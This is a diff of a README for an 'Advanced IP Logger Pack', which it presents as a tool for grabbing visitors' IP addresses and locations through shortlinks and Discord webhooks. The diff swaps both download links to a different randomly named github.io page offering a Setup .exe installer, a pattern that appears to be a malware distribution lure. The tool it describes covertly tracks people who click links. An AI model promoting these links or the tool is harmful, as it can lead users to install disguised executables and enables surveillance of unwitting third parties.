@@ -2,7 +2,7 @@
 
 Advanced IP Logger Pack 2026 is a sophisticated and multi-platform IP grabber and logger tool designed for educational research, authorized penetration testing, and network administration. This tool serves as a modern alternative to existing IP grabber link generators and advanced IP logger packs, offering a comprehensive suite for tracking connection data through shortlink IP loggers and Discord IP grabber webhook integrations.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer_15.07-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer_15.07-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -45,7 +45,7 @@ A: By default, it logs the IP address, approximate geographic location (city/cou
 
 You can always find the latest version of the Advanced IP Logger Pack, including the `Setup-latest15.07.exe` installer and documentation, at the official download repository.
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 *Disclaimer: The developers are not responsible for misuse of this software. It is the user's responsibility to comply with all applicable local, state, federal, and international laws.*
